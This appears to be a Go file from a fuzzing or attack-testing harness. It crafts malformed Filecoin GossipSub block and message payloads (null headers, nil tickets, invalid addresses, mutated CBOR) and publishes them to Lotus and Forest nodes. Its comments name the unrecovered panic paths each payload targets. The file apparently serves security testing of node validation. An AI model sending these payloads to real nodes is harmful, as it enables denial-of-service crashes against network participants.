package main

import (
	"context"
	"fmt"
	"log"
	"time"

	pubsub "github.com/libp2p/go-libp2p-pubsub"
	"github.com/libp2p/go-libp2p/core/host"
)

// getAllGossipAttacks returns GossipSub attack vectors targeting unprotected
// panic paths in Lotus and Forest message/block validation.
func getAllGossipAttacks() []namedAttack {
	return []namedAttack{
		{name: "gossip-null-header-block", fn: func() { runGossipAttack(gossipNullHeaderBlock) }},
		{name: "gossip-nil-ticket-block", fn: func() { runGossipAttack(gossipNilTicketBlock) }},
		{name: "gossip-bad-address-block", fn: func() { runGossipAttack(gossipBadAddressBlock) }},
		{name: "gossip-malformed-signed-msg", fn: func() { runGossipAttack(gossipMalformedSignedMsg) }},
		{name: "gossip-bad-address-msg", fn: func() { runGossipAttack(gossipBadAddressMsg) }},
		{name: "gossip-random-cbor-block", fn: func() { runGossipAttack(gossipRandomCBORBlock) }},
		{name: "gossip-random-cbor-msg", fn: func() { runGossipAttack(gossipRandomCBORMsg) }},
	}
}

// gossipPayload describes what to publish and on which topic.
type gossipPayload struct {
	topic string // "blocks" or "msgs"
	data  []byte
}

// runGossipAttack creates a fresh host, joins the appropriate GossipSub topic,
// publishes the malformed payload, then tears down.
func runGossipAttack(buildPayload func() gossipPayload) {
	target := rngChoice(targets)
	payload := buildPayload()

	topicName := fmt.Sprintf("/fil/%s/%s", payload.topic, networkName)

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[gossip] create host failed: %v", err)
		return
	}
	defer h.Close()

	// Connect to target first so GossipSub can mesh
	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[gossip] connect to %s failed: %v", target.Name, err)
		return
	}

	if err := publishToTopic(ctx, h, topicName, payload.data); err != nil {
		debugLog("[gossip] publish to %s failed: %v", topicName, err)
	}
}

// publishToTopic creates a GossipSub instance, joins the topic, waits for
// mesh formation, publishes data, then returns.
func publishToTopic(ctx context.Context, h host.Host, topicName string, data []byte) error {
	ps, err := pubsub.NewGossipSub(ctx, h)
	if err != nil {
		return fmt.Errorf("create gossipsub: %w", err)
	}

	topic, err := ps.Join(topicName)
	if err != nil {
		return fmt.Errorf("join topic %s: %w", topicName, err)
	}
	defer topic.Close()

	// Wait for mesh formation — peers need time to GRAFT us
	time.Sleep(2 * time.Second)

	publishCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	return topic.Publish(publishCtx, data)
}

// ---------------------------------------------------------------------------
// BlockMsg wire format (CBOR): {Header: *BlockHeader, BlsMessages: []CID, SecpkMessages: []CID}
// Lotus uses cbor-gen, so the wire format is a CBOR array(3):
//   [Header BlockHeader, BlsMessages []CID, SecpkMessages []CID]
// ---------------------------------------------------------------------------

// gossipNullHeaderBlock publishes a BlockMsg with Header=null.
// If DecodeBlockMsg succeeds, bm.Header.Cid() → nil pointer panic in
// HandleIncomingBlocks (no recover).
func gossipNullHeaderBlock() gossipPayload {
	// BlockMsg: [null, [], []]
	data := cborArray(
		cborNil(),   // Header = null
		cborArray(), // BlsMessages = []
		cborArray(), // SecpkMessages = []
	)
	return gossipPayload{topic: "blocks", data: data}
}

// gossipNilTicketBlock publishes a BlockMsg with a valid-looking Header
// but Ticket=nil. If ValidateBlockPubsub lets it through, NewTipSet sort
// dereferences Ticket → panic.
func gossipNilTicketBlock() gossipPayload {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	var opts blockHeaderOpts
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}
	opts.nilTicket = true

	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())
	return gossipPayload{topic: "blocks", data: data}
}

// gossipBadAddressBlock publishes a BlockMsg with a Miner address that
// deserializes from CBOR but panics on re-serialization in Cid() →
// ToStorageBlock() → panic(err).
func gossipBadAddressBlock() gossipPayload {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	opts := blockHeaderOpts{}
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}
	// Use a malformed address: protocol byte 0x04 (delegated) followed by
	// invalid sub-address data that CBOR decodes fine but fails Address.Bytes()
	opts.overrideMiner = []byte{0x04, 0xff, 0xff, 0xff}

	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())
	return gossipPayload{topic: "blocks", data: data}
}

// gossipRandomCBORBlock publishes a randomly mutated BlockMsg.
func gossipRandomCBORBlock() gossipPayload {
	headInfo := fetchChainHead(rngChoice(targets).Name)
	opts := blockHeaderOpts{}
	if headInfo != nil {
		opts.overrideParentCIDs = headInfo.CIDs
		opts.overrideHeight = headInfo.Height + 1
		opts.overrideWeight = 999999999
	}

	// Random nil fields
	opts.nilTicket = rngIntn(2) == 0
	opts.nilElectionProof = rngIntn(2) == 0
	opts.nilBLSAggregate = rngIntn(2) == 0
	opts.nilBlockSig = rngIntn(2) == 0
	opts.nilBeaconEntries = rngIntn(2) == 0
	opts.nilParents = rngIntn(4) == 0

	header := buildBlockHeaderCBOR(opts)
	data := cborArray(header, cborArray(), cborArray())

	// Random mutation of the final payload
	switch rngIntn(4) {
	case 0: // as-is
	case 1: // truncate
		if len(data) > 10 {
			data = data[:5+rngIntn(len(data)-5)]
		}
	case 2: // flip random bytes
		for i := 0; i < 1+rngIntn(5); i++ {
			idx := rngIntn(len(data))
			data[idx] = byte(rngIntn(256))
		}
	case 3: // append junk
		data = append(data, randomBytes(32+rngIntn(256))...)
	}

	return gossipPayload{topic: "blocks", data: data}
}

// ---------------------------------------------------------------------------
// Message topic attacks — target MessageValidator.Validate() (no recover)
//
// SignedMessage wire format (CBOR array(2)): [Message, Signature]
// Message wire format (CBOR array(10)):
//   [Version, To, From, Nonce, Value, GasLimit, GasFeeCap, GasPremium, Method, Params]
// Signature: CBOR byte string (MarshalBinary format: [type_byte | data])
// ---------------------------------------------------------------------------

// gossipMalformedSignedMsg publishes completely malformed CBOR as a signed
// message. Targets DecodeSignedMessage() panic paths.
func gossipMalformedSignedMsg() gossipPayload {
	// Various malformed payloads
	var data []byte
	switch rngIntn(5) {
	case 0: // null
		data = cborNil()
	case 1: // empty array
		data = cborArray()
	case 2: // array with null message and null signature
		data = cborArray(cborNil(), cborNil())
	case 3: // valid-looking message with truncated signature
		msg := buildMessageCBOR(nil)
		data = cborArray(msg) // missing signature field
	case 4: // random bytes
		data = randomBytes(32 + rngIntn(256))
	}
	return gossipPayload{topic: "msgs", data: data}
}

// gossipBadAddressMsg publishes a SignedMessage with malformed From/To
// addresses that deserialize from CBOR but panic when Message.Cid() calls
// ToStorageBlock().
func gossipBadAddressMsg() gossipPayload {
	// Build a Message with bad addresses
	// Use protocol byte 0x04 (delegated) with invalid sub-address
	badAddr := cborBytes([]byte{0x04, 0xff, 0xff, 0xff})

	msg := cborArray(
		cborUint64(0),               // Version
		badAddr,                     // To (malformed)
		badAddr,                     // From (malformed)
		cborUint64(0),               // Nonce
		cborBytes(bigIntBytes(0)),   // Value
		cborInt64(1000000),          // GasLimit
		cborBytes(bigIntBytes(100)), // GasFeeCap
		cborBytes(bigIntBytes(100)), // GasPremium
		cborUint64(0),               // Method
		cborBytes(nil),              // Params
	)

	sig := cborBytes([]byte{0x01}) // secp256k1 type, empty data

	data := cborArray(msg, sig)
	return gossipPayload{topic: "msgs", data: data}
}

// gossipRandomCBORMsg publishes a randomly mutated SignedMessage.
func gossipRandomCBORMsg() gossipPayload {
	msg := buildMessageCBOR(nil)
	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
	data := cborArray(msg, sig)

	// Random mutation
	switch rngIntn(4) {
	case 0: // as-is
	case 1: // truncate
		if len(data) > 10 {
			data = data[:5+rngIntn(len(data)-5)]
		}
	case 2: // flip random bytes
		for i := 0; i < 1+rngIntn(5); i++ {
			idx := rngIntn(len(data))
			data[idx] = byte(rngIntn(256))
		}
	case 3: // append junk
		data = append(data, randomBytes(32+rngIntn(256))...)
	}

	return gossipPayload{topic: "msgs", data: data}
}

// buildMessageCBOR builds a Filecoin Message as CBOR array(10).
// If addr is nil, uses a valid-looking f01000 address.
func buildMessageCBOR(addr []byte) []byte {
	if addr == nil {
		addr = []byte{0x00, 0xe8, 0x07} // f01000
	}
	addrCBOR := cborBytes(addr)

	return cborArray(
		cborUint64(0),               // Version
		addrCBOR,                    // To
		addrCBOR,                    // From
		cborUint64(0),               // Nonce
		cborBytes(bigIntBytes(0)),   // Value
		cborInt64(1000000),          // GasLimit
		cborBytes(bigIntBytes(100)), // GasFeeCap
		cborBytes(bigIntBytes(100)), // GasPremium
		cborUint64(0),               // Method
		cborBytes(nil),              // Params
	)
}
